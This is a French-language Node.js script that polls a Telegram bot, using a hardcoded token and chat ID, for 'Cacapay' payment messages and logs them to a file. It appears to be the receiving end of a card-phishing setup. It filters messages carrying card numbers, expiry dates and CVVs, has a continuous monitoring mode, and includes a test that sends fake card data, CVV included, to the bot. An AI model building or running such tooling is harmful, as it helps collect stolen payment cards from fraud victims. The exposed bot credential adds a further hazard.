const fetch = require('node-fetch');

console.log('📱 VISIONNEUSE DE MESSAGES TELEGRAM');
console.log('===================================');

const CONFIG = {
    TELEGRAM_BOT_TOKEN: '8045865062:AAFoDtE5f3w3RNmaGh3-n2X7Lbzpo0ShXSU',
    TELEGRAM_CHAT_ID: '6523794278',
    LOG_FILE: 'telegram_messages.txt'
};

let lastMessageId = 0;

// Fonction pour récupérer les messages depuis Telegram
async function getTelegramMessages() {
    try {
        console.log('🔍 Récupération des messages depuis Telegram...');
        const response = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastMessageId + 1}&limit=10`);
        const data = await response.json();
        
        if (data.ok && data.result && data.result.length > 0) {
            console.log(`📨 ${data.result.length} messages trouvés sur Telegram`);
            
            // Filtrer les messages de paiement
            const paymentMessages = data.result.filter(update => {
                if (update.message && update.message.text) {
                    const text = update.message.text.toLowerCase();
                    return text.includes('nouveau paiement') || 
                           text.includes('paiement reçu') || 
                           text.includes('montant:') || 
                           text.includes('carte:') ||
                           text.includes('vérifiez immédiatement') ||
                           text.includes('cacapay') ||
                           text.includes('€') ||
                           text.includes('paiement sécurisé') ||
                           text.includes('finalisez votre commande');
                }
                return false;
            });
            
            if (paymentMessages.length > 0) {
                console.log(`💰 ${paymentMessages.length} messages de paiement détectés !`);
                
                // Mettre à jour le dernier message ID
                lastMessageId = Math.max(...data.result.map(update => update.update_id));
                
                return paymentMessages.map(update => ({
                    id: update.message.message_id,
                    message: update.message.text,
                    timestamp: new Date(update.message.date * 1000).toISOString(),
                    sender: 'Cacapaybot',
                    type: 'payment_message'
                }));
            }
        }
        return [];
    } catch (error) {
        console.error('❌ Erreur récupération messages Telegram:', error);
        return [];
    }
}

// Fonction pour afficher le message
function displayMessage(message) {
    console.log('\n' + '='.repeat(60));
    console.log('📱 MESSAGE CACAPAYBOT DÉTECTÉ');
    console.log('='.repeat(60));
    console.log(`🆔 ID: ${message.id}`);
    console.log(`📅 Date: ${new Date(message.timestamp).toLocaleString()}`);
    console.log(`👤 Expéditeur: ${message.sender}`);
    console.log(`📝 Type: ${message.type}`);
    console.log('\n📄 CONTENU:');
    console.log('-'.repeat(40));
    console.log(message.message);
    console.log('-'.repeat(40));
    console.log('='.repeat(60));
}

// Fonction pour sauvegarder le message dans un fichier
function saveMessageToFile(message) {
    const fs = require('fs');
    const content = `
=== MESSAGE CACAPAYBOT DÉTECTÉ ===
ID: ${message.id}
Date: ${new Date(message.timestamp).toLocaleString()}
Expéditeur: ${message.sender}
Type: ${message.type}

CONTENU:
${message.message}
=== FIN DU MESSAGE ===
`;
    
    try {
        fs.writeFileSync(CONFIG.LOG_FILE, content);
        console.log(`💾 Message sauvegardé dans: ${CONFIG.LOG_FILE}`);
    } catch (error) {
        console.error('❌ Erreur sauvegarde:', error);
    }
}

// Fonction pour envoyer un message de test
async function sendTestMessage() {
    try {
        console.log('🧪 Envoi d\'un message de test...');
        
        const testMessage = `💰 MESSAGE DE TEST VISIONNEUSE !
👤 Nom: Test Viewer
📧 Email: test@viewer.com
💳 Carte: 1234 **** **** 5678
📅 Expiration: 12/25
🔐 CVV: 123
💶 Montant: 99.99€
🔒 Vérifiez immédiatement !`;

        const response = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                text: testMessage
            })
        });
        
        const result = await response.json();
        
        if (result.ok) {
            console.log('✅ Message de test envoyé !');
            console.log('⏳ Attente de 3 secondes...');
            
            // Attendre un peu pour que le message soit traité
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            return true;
        }
        
        return false;
    } catch (error) {
        console.error('❌ Erreur envoi message test:', error);
        return false;
    }
}

// Fonction principale
async function main() {
    const args = process.argv.slice(2);
    
    if (args.includes('--test')) {
        // Mode test - envoyer un message et l'afficher
        console.log('🧪 MODE TEST - Envoi et affichage d\'un message');
        const sent = await sendTestMessage();
        
        if (sent) {
            const messages = await getTelegramMessages();
            if (messages.length > 0) {
                const lastMessage = messages[0];
                displayMessage(lastMessage);
                saveMessageToFile(lastMessage);
            } else {
                console.log('❌ Aucun message trouvé après l\'envoi');
            }
        }
    } else if (args.includes('--monitor')) {
        // Mode surveillance continue
        console.log('🔄 MODE SURVEILLANCE - Appuyez sur Ctrl+C pour arrêter');
        
        while (true) {
            const messages = await getTelegramMessages();
            
            if (messages.length > 0) {
                const lastMessage = messages[0];
                displayMessage(lastMessage);
                saveMessageToFile(lastMessage);
            } else {
                console.log('📭 Aucun nouveau message');
            }
            
            console.log('⏳ Attente de 5 secondes...');
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    } else {
        // Mode normal - afficher le dernier message
        const messages = await getTelegramMessages();
        
        if (messages.length > 0) {
            const lastMessage = messages[0];
            displayMessage(lastMessage);
            saveMessageToFile(lastMessage);
        } else {
            console.log('📭 Aucun message trouvé');
            console.log('💡 Utilisez --test pour envoyer un message de test');
            console.log('💡 Utilisez --monitor pour la surveillance continue');
        }
    }
}

// Exécuter
main().catch(console.error);
